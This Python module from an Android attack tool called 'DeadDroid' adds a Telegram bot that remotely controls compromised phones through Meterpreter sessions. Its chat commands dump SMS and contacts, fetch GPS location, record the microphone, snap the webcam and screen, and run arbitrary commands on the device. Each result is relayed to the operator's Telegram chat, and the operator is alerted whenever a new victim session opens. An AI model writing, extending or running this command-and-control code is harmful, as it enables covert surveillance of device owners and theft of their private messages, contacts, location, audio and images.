"""
Telegram Bot Integration — unique to DeadDroid.

Two capabilities no other Android pentest tool has:
  1. Push alerts to your Telegram when a new session opens (with device info)
  2. Remote-control active sessions FROM Telegram chat — no terminal needed

Requires: pip install pyTelegramBotAPI
Setup: Create a bot via @BotFather, get token + your chat_id.
"""

import threading
import time
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, Confirm
from core.utils import WORKSPACE, save_json, load_json, log_event

console = Console()
CONFIG_FILE = WORKSPACE / "telegram_config.json"

_bot = None
_bot_thread: Optional[threading.Thread] = None
_active_session: Optional[int] = None


def _load_config() -> dict:
    return load_json(CONFIG_FILE)


def _save_config(token: str, chat_id: str):
    save_json(CONFIG_FILE, {"token": token, "chat_id": chat_id})


def setup_telegram():
    console.rule("[bold cyan]Telegram Bot Setup[/]")
    console.print(
        "[dim]1. Open Telegram → search @BotFather\n"
        "2. Send /newbot → follow steps → copy the token\n"
        "3. Start your bot, then message it anything\n"
        "4. Get your chat_id: https://api.telegram.org/bot<TOKEN>/getUpdates\n[/]"
    )
    token   = Prompt.ask("Bot token")
    chat_id = Prompt.ask("Your chat ID")

    try:
        import telebot
        bot = telebot.TeleBot(token)
        bot.send_message(chat_id, "✅ DeadDroid connected! Type /help for commands.")
        _save_config(token, chat_id)
        console.print("[green]✔ Telegram bot configured and tested.[/]")
    except ImportError:
        console.print("[red]✘ pyTelegramBotAPI not installed.[/]  Run: pip install pyTelegramBotAPI")
    except Exception as e:
        console.print(f"[red]✘ Failed:[/] {e}")


def notify_new_session(session_id: int, session_info: dict):
    """Push a Telegram message when a new Meterpreter session opens."""
    cfg = _load_config()
    if not cfg.get("token") or not cfg.get("chat_id"):
        return

    try:
        import telebot
        bot = telebot.TeleBot(cfg["token"], threaded=False)
        msg = (
            f"🔴 *New Session Opened!*\n\n"
            f"*Session ID:* `{session_id}`\n"
            f"*Type:* `{session_info.get('type', 'unknown')}`\n"
            f"*Info:* `{session_info.get('info', '')}`\n"
            f"*Platform:* `{session_info.get('platform', '')}`\n"
            f"*Payload:* `{session_info.get('via_payload', '')}`\n"
            f"*Tunnel:* `{session_info.get('tunnel_local', '')}`\n\n"
            f"Use /use {session_id} to interact."
        )
        bot.send_message(cfg["chat_id"], msg, parse_mode="Markdown")
        log_event(f"Telegram notified: new session {session_id}")
    except Exception as e:
        log_event(f"Telegram notify failed: {e}")


def notify_session_lost(session_id: int):
    cfg = _load_config()
    if not cfg.get("token"):
        return
    try:
        import telebot
        bot = telebot.TeleBot(cfg["token"], threaded=False)
        bot.send_message(cfg["chat_id"], f"⚠️ Session {session_id} lost.", parse_mode="Markdown")
    except Exception:
        pass


def start_remote_control_bot():
    """
    Start a Telegram polling bot that lets you control sessions
    via chat commands — run sessions from your phone.
    """
    cfg = _load_config()
    if not cfg.get("token") or not cfg.get("chat_id"):
        console.print("[red]✘ Telegram not configured. Run setup first.[/]")
        return

    try:
        import telebot
    except ImportError:
        console.print("[red]✘ pyTelegramBotAPI not installed.[/]  Run: pip install pyTelegramBotAPI")
        return

    global _bot, _active_session
    _bot   = telebot.TeleBot(cfg["token"])
    allowed = str(cfg["chat_id"])

    def guard(func):
        """Only respond to the configured chat_id."""
        def wrapper(message):
            if str(message.chat.id) != allowed:
                return
            func(message)
        return wrapper

    @_bot.message_handler(commands=["help"])
    @guard
    def cmd_help(msg):
        help_text = (
            "🤖 *DeadDroid Remote Control*\n\n"
            "/sessions — List active sessions\n"
            "/use <id> — Select a session\n"
            "/info — Device info (selected session)\n"
            "/ss — Screenshot\n"
            "/sms — Dump SMS\n"
            "/contacts — Dump contacts\n"
            "/loc — Get GPS location\n"
            "/mic <secs> — Record microphone\n"
            "/cam — Webcam snapshot\n"
            "/shell <cmd> — Run Meterpreter command\n"
            "/keepalive — Start keepalive\n"
            "/status — DeadDroid status\n"
            "/stop — Stop this bot"
        )
        _bot.reply_to(msg, help_text, parse_mode="Markdown")

    @_bot.message_handler(commands=["sessions"])
    @guard
    def cmd_sessions(msg):
        try:
            from core.session_mgr import list_sessions
            sessions = list_sessions()
            if not sessions:
                _bot.reply_to(msg, "No active sessions.")
                return
            lines = []
            for sid, info in sessions.items():
                lines.append(f"`{sid}` — {info.get('type','')} | {info.get('info','')[:30]}")
            _bot.reply_to(msg, "📡 *Sessions:*\n" + "\n".join(lines), parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["use"])
    @guard
    def cmd_use(msg):
        global _active_session
        parts = msg.text.split()
        if len(parts) < 2:
            _bot.reply_to(msg, "Usage: /use <session_id>")
            return
        try:
            _active_session = int(parts[1])
            _bot.reply_to(msg, f"✅ Selected session `{_active_session}`", parse_mode="Markdown")
        except ValueError:
            _bot.reply_to(msg, "Invalid session ID.")

    def _require_session(msg) -> Optional[int]:
        if _active_session is None:
            _bot.reply_to(msg, "No session selected. Use /use <id>")
            return None
        return _active_session

    @_bot.message_handler(commands=["info"])
    @guard
    def cmd_info(msg):
        sid = _require_session(msg)
        if sid is None: return
        _bot.reply_to(msg, f"⏳ Fetching device info for session {sid}...")
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "sysinfo")
            _bot.reply_to(msg, f"```\n{out[:3000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["ss"])
    @guard
    def cmd_screenshot(msg):
        sid = _require_session(msg)
        if sid is None: return
        _bot.reply_to(msg, "📸 Taking screenshot...")
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "screenshot")
            _bot.reply_to(msg, f"```\n{out[:1000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["sms"])
    @guard
    def cmd_sms(msg):
        sid = _require_session(msg)
        if sid is None: return
        _bot.reply_to(msg, "💬 Dumping SMS...")
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "dump_sms")
            for chunk in [out[i:i+3000] for i in range(0, min(len(out), 9000), 3000)]:
                _bot.send_message(allowed, f"```\n{chunk}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["contacts"])
    @guard
    def cmd_contacts(msg):
        sid = _require_session(msg)
        if sid is None: return
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "dump_contacts")
            _bot.reply_to(msg, f"```\n{out[:3000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["loc"])
    @guard
    def cmd_location(msg):
        sid = _require_session(msg)
        if sid is None: return
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "geolocate")
            _bot.reply_to(msg, f"📍\n```\n{out[:1000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["mic"])
    @guard
    def cmd_mic(msg):
        sid = _require_session(msg)
        if sid is None: return
        parts = msg.text.split()
        dur   = int(parts[1]) if len(parts) > 1 else 10
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, f"record_mic -d {dur}")
            _bot.reply_to(msg, f"🎙️\n```\n{out[:1000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["cam"])
    @guard
    def cmd_cam(msg):
        sid = _require_session(msg)
        if sid is None: return
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, "webcam_snap")
            _bot.reply_to(msg, f"📷\n```\n{out[:1000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["shell"])
    @guard
    def cmd_shell(msg):
        sid = _require_session(msg)
        if sid is None: return
        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            _bot.reply_to(msg, "Usage: /shell <meterpreter command>")
            return
        try:
            from core.session_mgr import run_meterpreter
            out = run_meterpreter(sid, parts[1])
            _bot.reply_to(msg, f"```\n{out[:3000]}\n```", parse_mode="Markdown")
        except Exception as e:
            _bot.reply_to(msg, f"Error: {e}")

    @_bot.message_handler(commands=["keepalive"])
    @guard
    def cmd_keepalive(msg):
        sid = _require_session(msg)
        if sid is None: return
        from core.session_mgr import start_keepalive
        start_keepalive(sid, 60)
        _bot.reply_to(msg, f"✅ Keepalive started for session {sid}.")

    @_bot.message_handler(commands=["status"])
    @guard
    def cmd_status(msg):
        from core.utils import get_local_ip, get_public_ip
        from core.session_mgr import list_sessions
        sessions = list_sessions()
        _bot.reply_to(
            msg,
            f"🔴 *DeadDroid Status*\n"
            f"Local IP: `{get_local_ip()}`\n"
            f"Sessions: `{len(sessions)}`\n"
            f"Selected: `{_active_session}`",
            parse_mode="Markdown",
        )

    @_bot.message_handler(commands=["stop"])
    @guard
    def cmd_stop(msg):
        _bot.reply_to(msg, "🛑 Bot stopping...")
        _bot.stop_polling()

    console.print("[green]✔ Telegram bot started — check your Telegram for /help[/]")
    log_event("Telegram remote control bot started")

    global _bot_thread
    _bot_thread = threading.Thread(
        target=lambda: _bot.infinity_polling(timeout=10, long_polling_timeout=5),
        daemon=True,
    )
    _bot_thread.start()
    console.print("[dim]Bot running in background. Ctrl+C here won't stop it.[/]")


def interactive_telegram():
    console.rule("[bold cyan]Telegram Bot[/]")

    menu = {
        "1": "Setup / Configure bot",
        "2": "Start remote control bot",
        "3": "Send test notification",
        "4": "Back",
    }
    from rich.table import Table
    m = Table(show_header=False, box=None)
    for k, v in menu.items():
        m.add_row(f"[yellow][{k}][/]", v)
    console.print(m)

    choice = Prompt.ask("Select", choices=list(menu.keys()), default="4")
    if choice == "1":
        setup_telegram()
    elif choice == "2":
        start_remote_control_bot()
    elif choice == "3":
        notify_new_session(0, {"type": "test", "info": "Test notification", "platform": "android"})
        console.print("[green]✔ Test notification sent.[/]")
